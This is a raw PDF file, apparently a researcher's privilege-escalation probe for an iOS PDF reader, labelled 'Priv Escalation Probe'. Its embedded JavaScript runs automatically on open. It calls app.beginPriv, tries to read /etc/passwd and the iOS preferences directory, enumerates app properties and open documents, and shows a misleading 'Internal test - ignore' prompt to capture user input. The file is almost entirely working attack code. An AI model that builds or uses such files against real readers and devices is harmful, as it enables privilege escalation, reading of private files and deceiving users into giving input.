%PDF-1.7
% beginPriv File Read Probe - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        // === 1. PRIVILEGED CONTEXT ===
        results.push("=== PRIV CONTEXT ===");
        try {
          app.beginPriv();
          results.push("beginPriv: ok");

          // Try file reads inside privileged context
          try {
            var d1 = app.openDoc("/etc/passwd");
            results.push("openDoc passwd: " + typeof d1 + " " + d1);
          } catch(e) { results.push("openDoc passwd: " + e); }

          try {
            var d2 = app.openDoc("/var/mobile/Library/Preferences/");
            results.push("openDoc prefs: " + typeof d2 + " " + d2);
          } catch(e) { results.push("openDoc prefs: " + e); }

          try {
            var d3 = app.openDoc(this.path);
            results.push("openDoc self: " + typeof d3);
          } catch(e) { results.push("openDoc self: " + e); }

          // Try app.response to capture user input
          try {
            results.push("response type: " + typeof app.response);
          } catch(e) { results.push("response: " + e); }

          // Try reading doc properties privileged
          try {
            results.push("priv doc.path: " + this.path);
            results.push("priv doc.URL: " + this.URL);
          } catch(e) { results.push("doc props: " + e); }

          // Enumerate all app properties inside priv
          try {
            var privKeys = [];
            for (var k in app) {
              privKeys.push(k + ":" + typeof app[k]);
            }
            results.push("app keys in priv: " + privKeys.join(", "));
          } catch(e) { results.push("app enum priv: " + e); }

          app.endPriv();
          results.push("endPriv: ok");
        } catch(e) { results.push("priv block: " + e); }

        // === 2. INTER-DOC COMMUNICATION ===
        results.push("=== INTER-DOC ===");
        try {
          results.push("numDocs: " + app.numDocs);
        } catch(e) { results.push("numDocs: " + e); }
        try {
          for (var i = 0; i < app.numDocs; i++) {
            results.push("doc[" + i + "]: " + app.openDoc(i));
          }
        } catch(e) { results.push("doc loop: " + e); }

        // === 3. RESPONSE / INPUT CAPTURE ===
        results.push("=== INPUT ===");
        try {
          var resp = app.response({
            cQuestion: "Internal test - ignore",
            cTitle: "Debug",
            cDefault: ""
          });
          results.push("response captured: " + resp);
        } catch(e) { results.push("response: " + e); }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Priv Escalation Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Check alert output) Tj ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000135 00000 n 
0000002500 00000 n 
0000002660 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
2750
%%EOF